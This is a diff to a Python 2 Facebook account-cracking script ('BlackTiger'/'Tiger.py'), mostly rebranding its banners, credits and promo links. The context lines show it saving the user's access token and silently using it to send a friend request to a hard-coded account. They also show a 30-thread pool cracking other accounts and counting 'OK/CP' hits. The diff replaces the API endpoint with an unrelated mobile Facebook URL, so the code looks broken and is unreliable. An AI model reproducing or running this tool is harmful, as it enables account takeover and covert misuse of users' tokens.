@@ -80,11 +80,11 @@ print  """
 \033[1;96m~ RECODE #XIAODRFARKER !!!  ~
 \033[1;97m*****************************
 
-\033[1;95m____─▄───────▄█▄───────▄─ PAOK LU !
-\033[1;95m____▐█▌──▄──█████──▄──▐█▌ PAOK LU !
-\033[1;95m____─█──███▄▄███▄▄███──█─ 
-\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
-\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
+\033[1;95m PAOK LU !
+\033[1;95m PAOK LU !
+\033[1;95m PAOK LU ! 
+\033[1;95m PAOK LU ! 
+\033[1;95m PAOK LU ! 
 """
 jalan("\033[1;92m              #XIAODRFARKER ")             
 jalan("\033[1;92m             #XIAODRFARKER ")             
@@ -129,7 +129,7 @@ def login():
 		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://mobile.facebook.com/?stype=lo&jlou=AfcuKaDzvfMRDnfLS4GVeLpQ6wykdzRhZjS1W58sIgHRsluHoj7LeSm324bI0OqfnFWcb19z5VUG-tVNYda3p36hVel-OyE50h-IZUE5WnN4YQ&smuh=38944&lh=Ac-mE22kPjIwPB4U&ref=opera_speed_dial&_rdr')
 		except mechanize.URLError:
 			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 			keluar()
@@ -147,14 +147,14 @@ def login():
 				x.update(sig)
 				a=x.hexdigest()
 				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
+				url = "https://mobile.facebook.com/?stype=lo&jlou=AfcuKaDzvfMRDnfLS4GVeLpQ6wykdzRhZjS1W58sIgHRsluHoj7LeSm324bI0OqfnFWcb19z5VUG-tVNYda3p36hVel-OyE50h-IZUE5WnN4YQ&smuh=38944&lh=Ac-mE22kPjIwPB4U&ref=opera_speed_dial&_rdr"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.facebook.com/Mhmdaziz04')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -515,7 +515,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackTiger\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»" #Dev:Rana
+	print "  \033[1;91m«---•◈•---Developed #XIAODRFARKER--•◈•---»" #Dev:@mhmdaziz04
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Tiger.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -542,7 +542,7 @@ _______¶¶¶_________¶______¶_________¶¶¶______
 : \033[1;91m ....Aahil Creations....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;91m Aahil"""
+              \033[1;91m ZE casper"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
